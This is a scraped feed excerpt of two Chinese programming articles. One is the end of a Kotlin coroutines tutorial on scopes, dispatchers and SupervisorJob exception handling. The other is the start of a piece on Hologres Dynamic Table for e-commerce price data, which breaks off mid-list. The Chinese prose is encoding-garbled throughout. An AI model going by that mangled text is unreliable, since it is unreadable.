<p>å®ç°äº† CoroutineScope çš„ç±»ï¼Œåˆ›å»ºè¯¥ç±»çš„å¯¹è±¡ï¼Œå°±ä¼šå¾—åˆ°ä¸€ä¸ªåç¨‹ä½œç”¨åŸŸã€‚</p>
<p>GlobalScope æ˜¯åç¨‹æ¡†æ¶æä¾›çš„ä¸€ä¸ªå…¨å±€ä½œç”¨åŸŸï¼Œç”±äºå®ƒæ˜¯é™æ€çš„ï¼Œå› æ­¤å®ƒçš„ç”Ÿå‘½å‘¨æœŸä¸€ç›´æŒç»­åˆ°åº”ç”¨ç¨‹åºç»ˆæ­¢ã€‚åœ¨Androidé¢†åŸŸä¸­ï¼ŒGoogle æä¾›ä¸€ä¸ªä¸€ç³»åˆ—å…·æœ‰ç”Ÿå‘½å‘¨æœŸæ„ŸçŸ¥çš„ CoroutineScopeã€‚</p>
<ol>
<li>LifecycleScopeï¼šèƒ½ç›‘å¬é¡µé¢çš„ç”Ÿå‘½å‘¨æœŸï¼Œåœ¨é¡µé¢é”€æ¯çš„æ—¶å€™ï¼Œå–æ¶ˆåç¨‹</li>
<li>ViewModelScopeï¼šèƒ½å¤Ÿå’Œ ViewModel ç»‘å®šï¼Œåœ¨ ViewModel é”€æ¯çš„æ—¶å€™å–æ¶ˆåç¨‹</li>
<li>MainScopeï¼šä½œç”¨åœ¨ä¸»çº¿ç¨‹çš„åç¨‹ä½œç”¨åŸŸèƒ½å¤Ÿåœ¨è¿™é‡Œè¿›è¡Œ UI çš„æ›´æ–°</li>
</ol>
<h2 data-id="heading-2">ä¸‰ã€åç¨‹ä¸Šä¸‹æ–‡</h2>
<p>åç¨‹ä¸Šä¸‹æ–‡æ˜¯ä¸€ç³»åˆ—çš„å®ç°äº† Element çš„é›†åˆï¼ŒåŒ…æ‹¬äº† Jobã€CoroutineExceptionHandlerã€Dispatchersç­‰ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin">CoroutineContext = Job() + CoroutineName(<span class="hljs-string">""</span>) + CoroutineExceptionHandler { coroutineContext, throwable -&gt; } + Dispatchers.IO
</code></pre>
<p>å¦å¤–ï¼Œåç¨‹ä¸Šä¸‹æ–‡ä¹Ÿæ˜¯å¯ä»¥è¿›è¡Œè‡ªå®šä¹‰çš„ï¼Œåªéœ€è¦ç»§æ‰¿ Element å°±å¯ä»¥äº†ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserCoroutineContext</span>(<span class="hljs-keyword">val</span> id: String) : CoroutineContext.Element {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> key = KEY

    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> KEY : CoroutineContext.Key&lt;UserCoroutineContext&gt;
}
</code></pre>
<h2 data-id="heading-3">å››ã€åç¨‹å¯åŠ¨æ¨¡å¼</h2>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CoroutineStart</span> {
    DEFAULT,
    LAZY,
    <span class="hljs-meta">@ExperimentalCoroutinesApi</span> <span class="hljs-comment">// Since 1.0.0, no ETA on stability</span>
    ATOMIC,
    UNDISPATCHED;
}
</code></pre>
<p>æˆ‘ä»¬é€šå¸¸ç”¨ <strong>DEFAULT</strong> å’Œ <strong>LAZY</strong> çš„åœºæ™¯æ¯”è¾ƒå¤šï¼Œè¿™å››ç§å¯åŠ¨æ¨¡å¼çš„å¾ˆå¥½ç†è§£ï¼Œè§£é‡Šå¦‚ä¸‹ï¼š</p>
<ol>
<li>DEFAULTï¼šé»˜è®¤çš„å¯åŠ¨æ¨¡å¼ï¼Œåç¨‹åˆ›å»ºå®Œæˆä¹‹åå°±å¼€å§‹è°ƒåº¦</li>
<li>LAZYï¼šæ‡’åŠ è½½æ¨¡å¼ï¼Œä¾‹å¦‚ async ä¹‹åä¸ç›´æ¥å¯åŠ¨ï¼Œè€Œæ˜¯åœ¨ await ä¹‹åæ‰å¼€å§‹è°ƒåº¦</li>
<li>ATOMICï¼šå¯åŠ¨ä¹‹å‰ä¸å¯å–æ¶ˆ</li>
<li>UNDISPATCHEDï¼šç›´æ¥åŸºäºå½“å‰çº¿ç¨‹è°ƒç”¨ï¼Œç›´åˆ°é‡åˆ°ç¬¬ä¸€ä¸ªæŒ‚èµ·ç‚¹ï¼Œæ‰ä¼šåˆ‡æ¢åˆ° Dispatchers æŒ‡å®šçš„çº¿ç¨‹è¿›è¡Œè°ƒåº¦</li>
</ol>
<h2 data-id="heading-4">äº”ã€åç¨‹è°ƒåº¦å™¨</h2>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-keyword">actual</span> <span class="hljs-keyword">object</span> Dispatchers {
    <span class="hljs-meta">@JvmStatic</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">actual</span> <span class="hljs-keyword">val</span> Default: CoroutineDispatcher = DefaultScheduler

    <span class="hljs-meta">@JvmStatic</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">actual</span> <span class="hljs-keyword">val</span> Main: MainCoroutineDispatcher <span class="hljs-keyword">get</span>() = MainDispatcherLoader.dispatcher

    <span class="hljs-meta">@JvmStatic</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">actual</span> <span class="hljs-keyword">val</span> Unconfined: CoroutineDispatcher = kotlinx.coroutines.Unconfined

    <span class="hljs-meta">@JvmStatic</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">val</span> IO: CoroutineDispatcher = DefaultIoScheduler
}
</code></pre>
<p>åç¨‹çš„è°ƒåº¦æ–¹å¼åˆ†ä¸º 4 ç§ï¼Œè§£é‡Šå¦‚ä¸‹ï¼š</p>
<ol>
<li>Defaultï¼šå¤„ç† CPU å¯†é›†å‹çš„ä»»åŠ¡</li>
<li>Mainï¼šä¸»çº¿ç¨‹æ‰§è¡Œ</li>
<li>Unconfinedï¼šä¸æŒ‡å®šçº¿ç¨‹ï¼Œç›´åˆ°é‡åˆ°ç¬¬ä¸€ä¸ªæŒ‚èµ·ç‚¹ï¼ŒæŒ‚èµ·æ¢å¤ä¹‹åï¼Œåˆ‡æ¢åˆ°é»˜è®¤çš„çº¿ç¨‹</li>
<li>IOï¼šIO çº¿ç¨‹æ‰§è¡Œ</li>
</ol>
<h2 data-id="heading-5">å…­ã€åç¨‹å¼‚å¸¸å¤„ç†</h2>
<p>åœ¨ä¸€ä¸ªåç¨‹ä½œç”¨åŸŸå†…ï¼Œå¯åŠ¨äº†å¤šä¸ªåç¨‹ï¼Œå¦‚æœæŸä¸ªåç¨‹å¤±è´¥ï¼Œé‚£ä¹ˆå…¶å®ƒçš„åç¨‹ä¹Ÿä¼šå—åˆ°å½±å“è¢«å–æ¶ˆï¼Œå¦‚ä¸‹å›¾å®ä¾‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c0b8eae961c420dbfbd3ba03bc17455~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9ueV8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509581&amp;x-signature=j6j0eVG%2FdyAvDg5C%2FML0fcn8StM%3D" alt="image.png" loading="lazy"/></p>
<p>å¦‚æœè¦è®©å­åç¨‹ä¹‹é—´ä¸ä¼šç›¸äº’å½±å“ï¼Œå¯ä»¥ä½¿ç”¨ <strong>SupervisorJob</strong>ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    runBlocking {
        GlobalScope.launch {
            <span class="hljs-keyword">val</span> job1 = async(SupervisorJob()) {
                println(<span class="hljs-string">"job1"</span>)
                delay(<span class="hljs-number">1000</span>)
                error(<span class="hljs-string">"é”™è¯¯ï¼ï¼ï¼ï¼"</span>)
            }
            <span class="hljs-keyword">val</span> job2 = async() {
                delay(<span class="hljs-number">2000</span>)
                println(<span class="hljs-string">"job2"</span>)
            }
            job2.await()
            job1.await()
        }.join()
    }
}
</code></pre>
<p>æ—¥å¿—è¾“å‡ºå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-swift" lang="swift">job1
job2
<span class="hljs-type">Exception</span> <span class="hljs-keyword">in</span> thread <span class="hljs-string">"DefaultDispatcher-worker-1"</span> java.lang.<span class="hljs-type">IllegalStateException</span>: é”™è¯¯ï¼ï¼ï¼ï¼
	at com.xxxx.xxxx.xxxx.xxxxx.viewmodels.<span class="hljs-type">AKt</span><span class="hljs-variable">$main</span><span class="hljs-variable">$1</span><span class="hljs-variable">$1</span><span class="hljs-variable">$job1</span><span class="hljs-variable">$1</span>.invokeSuspend(<span class="hljs-type">A</span>.kt:<span class="hljs-number">42</span>)
</code></pre>
<p>job1 çš„å¤±è´¥ä¸ä¼šå½±å“ job2 çš„è¾“å‡ºï¼Œä½†æ˜¯åº”ç”¨ç¨‹åºä¾ç„¶ä¼šå‘ç”Ÿ Crashã€‚SupervisorJob èƒ½å¤Ÿé˜»æ­¢å¼‚å¸¸çš„ä¼ æ’­ï¼Œä½†æ˜¯æŠ›å‡ºçš„å¼‚å¸¸ä»ç„¶éœ€è¦è¢«æ­£ç¡®å¤„ç†æ‰è¡Œã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    runBlocking {
        <span class="hljs-keyword">val</span> handle = CoroutineExceptionHandler { coroutineContext, throwable -&gt;
            println(throwable.message)
        }
        GlobalScope.launch(handle) {
            <span class="hljs-keyword">val</span> job1 = async(SupervisorJob() ) {
                println(<span class="hljs-string">"job1"</span>)
                delay(<span class="hljs-number">1000</span>)
                error(<span class="hljs-string">"é”™è¯¯ï¼ï¼ï¼ï¼"</span>)
            }
            <span class="hljs-keyword">val</span> job2 = async() {
                delay(<span class="hljs-number">2000</span>)
                println(<span class="hljs-string">"job2"</span>)
            }
            job2.await()
            job1.await()
        }.join()
    }
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[HologresÂ DynamicÂ Tableåœ¨æ·˜å¤©ä»·æ ¼åŠ›çš„ä¸šåŠ¡å®è·µ]]></title>    <link>https://juejin.cn/post/7597243334176751656</link>    <guid>https://juejin.cn/post/7597243334176751656</guid>    <pubDate>2026-01-20T10:25:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597243334176751656" data-draft-id="7597024900521525300" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="HologresÂ DynamicÂ Tableåœ¨æ·˜å¤©ä»·æ ¼åŠ›çš„ä¸šåŠ¡å®è·µ"/> <meta itemprop="keywords" content="å¤§æ•°æ®,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-20T10:25:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿é‡Œäº‘å¤§æ•°æ®AIæŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/2414974667341287"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            HologresÂ DynamicÂ Tableåœ¨æ·˜å¤©ä»·æ ¼åŠ›çš„ä¸šåŠ¡å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2414974667341287/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿é‡Œäº‘å¤§æ•°æ®AIæŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:25:22.000Z" title="Tue Jan 20 2026 10:25:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>ä½œè€…ï¼š</strong> é—µåŠ å¤ | æ·˜å¤©é›†å›¢ä»·æ ¼å¹³å°å¼€å‘å·¥ç¨‹å¸ˆ</p>
<h2 data-id="heading-0">ä¸šåŠ¡ä»‹ç»</h2>
<p>æ·˜å¤©ä»·æ ¼åŠ›å›¢é˜Ÿä½œä¸ºå¹³å°ä»·æ ¼æ²»ç†çš„æ ¸å¿ƒéƒ¨é—¨ï¼Œæ‰¿è½½ç€æ·˜å®å¤©çŒ«å…¨åŸŸå•†å“ä»·æ ¼ç®¡ç†çš„é‡è¦èŒè´£ã€‚å›¢é˜ŸæŒæ¡ç€æ·˜å†…å¤–æ‰€æœ‰å•†å“çš„å…¨é‡ä»·æ ¼ä¿¡æ¯ï¼ŒåŒ…æ‹¬å•†å“åŸä»·ã€åˆ¸åä»·ç­‰å¤šç»´åº¦ä»·æ ¼æ•°æ®ï¼Œæ¯æ—¥å¢é‡æ•°æ®è§„æ¨¡è¾¾<strong>äº¿çº§</strong>ä»¥ä¸Šã€‚</p>
<p>åœ¨ç”µå•†å¤§ä¿ƒä¸Šä¸‹çº¿æ—¶ï¼ˆå¦‚618ã€åŒ11ï¼‰ï¼Œ<strong>ä»·æ ¼å˜åŠ¨</strong>é¢‘ç‡ä¼šå‘ˆç°æ•°å€å¢é•¿ï¼Œè¿™äº›æµ·é‡æ•°æ®ä¸ä»…ä½“é‡å¤§ï¼Œè€Œä¸”å…·æœ‰é«˜æ—¶æ•ˆæ€§ã€å¼ºå…³è”æ€§å’Œå¤æ‚å˜åŒ–ç‰¹å¾ã€‚åœ¨<strong>å¤§ä¿ƒå¸¸æ€åŒ–</strong>çš„ç°çŠ¶ä¸‹ï¼Œè¡Œä¸šè¿è¥æ€¥éœ€é«˜æ—¶æ•ˆæ€§çš„æ•°æ®çœ‹æ¿ä»¥ä¾¿åŠæ—¶å‘ç°é—®é¢˜ï¼Œå¹¶ä¸”éœ€è¦å•†å“ç»´åº¦ã€åº—é“ºç»´åº¦ç­‰<strong>å¤šç»´åœˆé€‰</strong>èƒ½åŠ›ï¼ŒåŠæ—¶åœˆé€‰å‡ºç¬¦åˆè¦æ±‚çš„æ•°æ®å¹¶è¿›è¡Œå¤„ç†æˆ–åˆ†æã€‚Hologres Dynamic Tableå®Œç¾å¥‘åˆä¸šåŠ¡éœ€æ±‚ã€‚</p>
<h2 data-id="heading-1">Hologres Dynamic Tableä»‹ç»</h2>
<p>è§†å›¾æ˜¯åŸºäºè¡¨çš„è™šæ‹Ÿè¡¨ï¼Œä¸å­˜å‚¨æ•°æ®åªå­˜å‚¨æŸ¥è¯¢é€»è¾‘ï¼Œæ¯æ¬¡è®¿é—®æ—¶åŠ¨æ€æ‰§è¡ŒSQLï¼Œè¿”å›æœ€æ–°ç»“æœï¼Œä¸»è¦å¸®åŠ©æˆ‘ä»¬ç®€åŒ–å¤æ‚æŸ¥è¯¢ã€‚å¦‚æœæ²¡æœ‰è§†å›¾ï¼Œé‚£ä¹ˆå¯¹äºä»¥ä¸‹æŸ¥è¯¢ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±ä¿å­˜åˆ°ä¸€ä¸ªåœ°æ–¹ï¼ŒæŸ¥è¯¢æ—¶æ‰§è¡Œå®Œæ•´SQLã€‚</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> region, <span class="hljs-built_in">SUM</span>(amount) <span class="hljs-keyword">as</span> total_sales 
<span class="hljs-keyword">FROM</span> orders 
<span class="hljs-keyword">WHERE</span> status <span class="hljs-operator">=</span> <span class="hljs-string">'completed'</span>;
</code></pre>
<p>å¦‚æœæœ‰è§†å›¾ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæŸ¥è¯¢æ‰˜ç®¡ç»™è§†å›¾ï¼Œç›´æ¥æŸ¥è¯¢è§†å›¾ï¼Œå¯ä»¥ç®€åŒ–ä½¿ç”¨ã€‚</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- åˆ›å»ºè§†å›¾</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">VIEW</span> sales_summary <span class="hljs-keyword">AS</span> 
<span class="hljs-keyword">SELECT</span> region, <span class="hljs-built_in">SUM</span>(amount) <span class="hljs-keyword">as</span> total_sales 
<span class="hljs-keyword">FROM</span> orders 
<span class="hljs-keyword">WHERE</span> status <span class="hljs-operator">=</span> <span class="hljs-string">'completed'</span>;

<span class="hljs-comment">-- æŸ¥è¯¢è§†å›¾</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> sales_summary;
</code></pre>
<p>è§†å›¾è™½ç„¶å¸®æˆ‘ä»¬ç®¡ç†äº†SQLçš„å®šä¹‰ï¼Œä½†æ˜¯å¤æ‚é€»è¾‘SQLçš„æ‰§è¡Œé€šå¸¸å¾ˆ<strong>è€—è´¹æ—¶é—´</strong>ã€‚å°†è§†å›¾çš„æŸ¥è¯¢ç»“æœå®é™…<strong>ä¿å­˜</strong>ä¸‹æ¥å°±æ˜¯<strong>ç‰©åŒ–è§†å›¾</strong>ã€‚ç‰©åŒ–è§†å›¾çš„ç»“æœéœ€è¦<strong>å®šæœŸæ›´æ–°</strong>ä»¥ä¿è¯æ•°æ®æ–°é²œåº¦ã€‚æ‰€ä»¥ç‰©åŒ–è§†å›¾å°±æ˜¯<strong>é¢„å®šä¹‰SQL + ç‰©åŒ–ç»“æœ + å‘¨æœŸæ›´æ–°</strong>ã€‚</p>
<p>Hologres Dynamic Tableä¸ç‰©åŒ–è§†å›¾ç±»ä¼¼ï¼Œæ¶æ„å¦‚ä¸‹ï¼Œæä¾›å…¨é‡åˆ·æ–°ä¸å¢é‡åˆ·æ–°ä¸¤ç§åˆ·æ–°æ¨¡å¼ã€‚</p>
<p>å…¨é‡åˆ·æ–°å°±æ˜¯åœ¨å‘¨æœŸåˆ°æ¥æ—¶è¿›è¡Œä¸€æ¬¡<strong>å…¨é‡åˆ·æ–°è¦†ç›–</strong>ï¼Œç›¸å½“äºInsert Overwriteã€‚</p>
<p>å¢é‡åˆ·æ–°æ¯æ¬¡åªå¤„ç†<strong>å¢é‡æ•°æ®</strong>ï¼ŒåŸç†ä¸ºåœ¨åº•å±‚åˆ›å»ºä¸€ä¸ªåˆ—å­˜stateè¡¨ï¼Œå­˜å‚¨ä¸­é—´çŠ¶æ€ï¼ˆç±»ä¼¼Flink stateï¼‰ã€‚å¢é‡æ•°æ®å…ˆä»¥å¾®æ‰¹æ¬¡æ–¹å¼åšå†…å­˜æ€èšåˆï¼Œå†ä¸stateè¡¨åˆå¹¶ï¼Œæœ€åæäº¤æ—¶ä»¥BulkLoadå†™å…¥åŠ¨æ€è¡¨ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c49117fc59c04516bab82e957b327f90~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509522&amp;x-signature=OoO6F9bE%2BIfDFQvslZGOjPFS2qQ%3D" alt="" loading="lazy"/></p>
<p>åœ¨ Hologres <strong>V3.1</strong> ä¸­ Dynamic Table çš„èƒ½åŠ›å¦‚ä¸‹ã€‚</p>
<p>å¤‡æ³¨</p>
<p>æä¾›autoæ¨¡å¼ï¼Œè‹¥Queryæ”¯æŒå¢é‡åˆ·æ–°åˆ™ä¼˜å…ˆé€‰æ‹©å¢é‡åˆ·æ–°ï¼Œå¦åˆ™é€€åŒ–ä¸ºå…¨é‡åˆ·æ–°</p>
<p><strong>æ–‡æ¡£</strong></p>
<p>â€‹<a href="https://link.juejin.cn?target=https%3A%2F%2Fhelp.aliyun.com%2Fzh%2Fhologres%2Fuser-guide%2Fintroduction-to-dynamic-table%3Fspm%3Dholoweb.holoweb.console-base_help.dexternal.ef9227d8HCGGEY" target="_blank" title="https://help.aliyun.com/zh/hologres/user-guide/introduction-to-dynamic-table?spm=holoweb.holoweb.console-base_help.dexternal.ef9227d8HCGGEY" ref="nofollow noopener noreferrer">â€‹https://help.aliyun.com/zh/hologres/user-guide/introduction-to-dynamic-table?spm=holoweb.holoweb.console-base\_help.dexternal.ef9227d8HCGGEY: https://help.aliyun.com/zh/hologres/user-guide/introduction-to-dynamic-table?spm=holoweb.holoweb.console-base\_help.dexternal.ef9227d8HCGGEYâ€‹</a>â€‹</p>
<p>åˆ·æ–°æ¨¡å¼</p>
<p>å¢é‡åˆ·æ–°</p>
<p>å…¨é‡åˆ·æ–°</p>
<p><strong>æŠ€æœ¯å®ç°</strong></p>
<p>å¾®æ‰¹æ¬¡å¢é‡å¤„ç†</p>
<p>INSERT OVERWRITE</p>
<p><strong>åˆ·æ–°è§¦å‘</strong></p>
<p>å®šæ—¶/æ‰‹åŠ¨</p>
<p><strong>æœ€å°å¯é…ç½®é—´éš”</strong></p>
<p>1åˆ†é’Ÿ</p>
<p><strong>å¢é‡æœºåˆ¶</strong></p>
<p>Binlogï¼šå¤„ç†CDCæ•°æ®</p>
<p>Streamï¼šæ–‡ä»¶çº§åˆ«å¤„ç†å¢é‡æ•°æ®ï¼Œè¯»å–æ€§èƒ½æ¯”Binlogé«˜ï¼Œä½†<strong>ä¸ç¨³å®š</strong>ï¼Œæš‚ä¸å»ºè®®ä½¿ç”¨</p>
<p>æ— ï¼ˆå…¨é‡ï¼‰</p>
<p><strong>åŸºè¡¨ç±»å‹</strong></p>
<p>å†…è¡¨ã€åŠ¨æ€è¡¨ã€Paimonå¤–è¡¨</p>
<p>å†…è¡¨ã€åŠ¨æ€è¡¨ã€Paimonå¤–è¡¨ã€ODPSå¤–è¡¨ã€DLFå¤–è¡¨</p>
<p><strong>Joinæ”¯æŒ</strong></p>
<p>âœ… å®Œæ•´Joinæ”¯æŒ</p>
<p><strong>èšåˆå‡½æ•°</strong></p>
<p>âœ… æ”¯æŒ</p>
<p>ç´¢å¼•é…ç½®</p>
<p>âœ… æ”¯æŒ</p>
<p>çª—å£å‡½æ•°</p>
<p>âŒ ä¸æ”¯æŒ</p>
<p>âœ… æ”¯æŒ</p>
<p>INå­æŸ¥è¯¢</p>
<p>âŒ ä¸æ”¯æŒ</p>
<p>âœ… æ”¯æŒ</p>
<p>æŸ¥è¯¢æ”¹å†™</p>
<p>âŒ ä¸æ”¯æŒ</p>
<p><strong>åˆ†åŒºæ”¯æŒ</strong></p>
<p>âœ… ç‰©ç†/é€»è¾‘åˆ†åŒº</p>
<p><strong>åˆ†åŒºåˆ·æ–°</strong></p>
<p>é…ç½®èŒƒå›´</p>
<p><strong>å†å²åˆ†åŒºå›åˆ·</strong></p>
<p>âœ… æ‰‹åŠ¨å›åˆ·</p>
<p>è®¡ç®—èµ„æº</p>
<p>Local/Serverless</p>
<p>Serverlessæ˜¯å®ä¾‹èµ„æºä¸Šé¢å¤–çš„èµ„æºï¼Œæœ€å¤§4096coreï¼Œå¯ä¸ºåŠ¨æ€è¡¨è®¾ç½®å¯ç”¨coreã€‚Paimonæš‚ä¸æ”¯æŒServerless</p>
<p><strong>èµ„æºéš”ç¦»</strong></p>
<p>å®ä¾‹èµ„æº/Serverlesséš”ç¦»</p>
<p><strong>Queryå˜æ›´ï¼šæ–°å¢åˆ—ã€ä¿®æ”¹è®¡ç®—é€»è¾‘</strong></p>
<p>âœ… æ”¯æŒ</p>
<p><strong>ä¸»è¦é™åˆ¶</strong></p>
<ul>
<li>
